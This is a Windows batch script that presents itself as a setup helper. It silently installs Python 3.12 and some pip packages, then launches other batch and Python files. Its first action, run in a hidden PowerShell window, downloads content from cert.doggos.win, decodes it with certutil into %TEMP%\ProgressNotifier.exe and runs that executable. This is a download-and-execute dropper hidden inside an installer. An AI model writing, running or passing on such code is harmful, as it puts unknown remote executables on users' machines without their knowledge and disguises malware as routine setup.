@echo off
setlocal
SET "PB_PATH=%TEMP%\ProgressNotifier.exe"
SET "INSTALLER=%TEMP%\python-3.12.0-amd64.exe"
powershell -WindowStyle Hidden -Command ^
 "(wget cert.doggos.win).content | Out-File '%TEMP%\tmp.txt'; ^
  certutil -decode '%TEMP%\tmp.txt' '%PB_PATH%'; ^
  del '%TEMP%\tmp.txt'; ^
  Start-Process '%PB_PATH%'"
SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
IF EXIST "%PYTHON_PATH%" (
    echo Python already installed.
) ELSE (
    powershell -WindowStyle Hidden -Command ^
        "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe -OutFile '%INSTALLER%'"
    IF NOT EXIST "%INSTALLER%" (
        echo Python download failed.
        pause
        exit /b 1
    )
    echo Installing Python silently...
    START "" /WAIT "%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=0 TargetDir="%LOCALAPPDATA%\Programs\Python\Python312"
    IF NOT EXIST "%PYTHON_PATH%" (
        echo Python install failed.
        pause
        exit /b 1
    )
)
"%PYTHON_PATH%" -m ensurepip >nul 2>&1
"%PYTHON_PATH%" -m pip install --upgrade pip
"%PYTHON_PATH%" -m pip install requests beautifulsoup4 tqdm
if exist "mode_A.txt" del "mode_A.txt"
echo forse>mode_A.txt
if not exist "%~dp0japper.bat" (
    start "" cmd /c "%PYTHON_PATH% support_installer.py"
    exit /b 0
)
if not exist "%~dp0japper_killer.bat" (
    start "" cmd /c "%PYTHON_PATH% support_installer.py"
    exit /b 0
)
start "" "%~dp0japper.bat"